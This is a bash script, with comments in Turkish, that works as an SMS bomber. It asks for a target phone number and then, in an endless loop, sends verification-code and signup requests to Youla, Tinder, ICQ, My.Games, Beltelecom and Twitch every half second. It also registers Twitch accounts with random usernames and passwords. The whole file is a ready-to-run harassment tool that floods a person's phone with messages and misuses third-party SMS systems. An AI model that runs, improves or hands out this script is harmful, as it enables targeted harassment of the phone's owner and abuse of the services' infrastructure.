#!/bin/bash

# Kullanıcıdan telefon numarası girmesini ister
read -p 'Enter Target Phone Number Without (+): ' phone

# Rastgele kullanıcı adı ve şifre oluşturur
generate_random_string() {
    tr -dc 'A-Za-z0-9' </dev/urandom | head -c 12
}

name=$(generate_random_string)
password="${name}$(generate_random_string)"
username="${name}$(generate_random_string)"

numplus="+$phone"

colors=( "\033[1;31m" "\033[1;32m" "\033[1;33m" "\033[1;34m" "\033[1;35m" "\033[1;36m" )
color=${colors[$RANDOM % ${#colors[@]}]}

echo -e "$color"

while true; do
    # 1
    echo "Sending request to https://youla.ru/web-api/auth/request_code"
    response=$(curl -s -X POST 'https://youla.ru/web-api/auth/request_code' -H 'Content-Type: application/json' -d "{\"phone\":\"$numplus\"}")
    echo "$response"
    sleep 0.5

    # 2
    echo "Sending request to https://api.gotinder.com/v2/auth/sms/send"
    response=$(curl -s -X POST 'https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru' -H 'Content-Type: application/json' -d "{\"phone_number\":\"$numplus\"}")
    echo "$response"
    sleep 0.5

    # 3
    echo "Sending request to https://www.icq.com/smsreg/requestPhoneValidation.php"
    response=$(curl -s -X POST "https://www.icq.com/smsreg/requestPhoneValidation.php/?msisdn=$phone&locale=en&countryCode=ru&k=ic1rtwz1s1Hj1O0r&version=1&r=46763")
    echo "$response"
    sleep 0.5

    # 4
    echo "Sending request to https://account.my.games/signup_send_sms/"
    response=$(curl -s -X POST 'https://account.my.games/signup_send_sms/' -d "phone=$phone")
    echo "$response"
    sleep 0.5

    # 5
    echo "Sending request to https://api.gotinder.com/v2/auth/sms/send"
    response=$(curl -s -X POST 'https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru' -H 'Content-Type: application/json' -d "{\"phone_number\":\"$phone\"}")
    echo "$response"
    sleep 0.5

    # 6
    echo "Sending request to https://myapi.beltelecom.by/api/v1/auth/check-phone"
    response=$(curl -s -X POST 'https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru' -H 'Content-Type: application/json' -d "{\"phone\":\"$phone\"}")
    echo "$response"
    sleep 0.5

    # 7
    echo "Sending request to https://passport.twitch.tv/register"
    response=$(curl -s -X POST 'https://passport.twitch.tv/register?trusted_request=true' -H 'Content-Type: application/json' -d "{\"birthday\":{\"day\":11,\"month\":11,\"year\":1999},\"client_id\":\"kd1unb4b3q4t58fwlpcbzcbnm76a8fp\",\"include_verification_code\":true,\"password\":\"$password\",\"phone_number\":\"$phone\",\"username\":\"$username\"}")
    echo "$response"
    sleep 0.5

    # 8
    echo "Sending request to https://api.gotinder.com/v2/auth/sms/send"
    response=$(curl -s -X POST 'https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru' -H 'Content-Type: application/json' -d "{\"phone_number\":\"$phone\"}")
    echo "$response"
    sleep 0.5

    # Renk değişimi
    color=${colors[$RANDOM % ${#colors[@]}]}
    echo -e "$color"
done
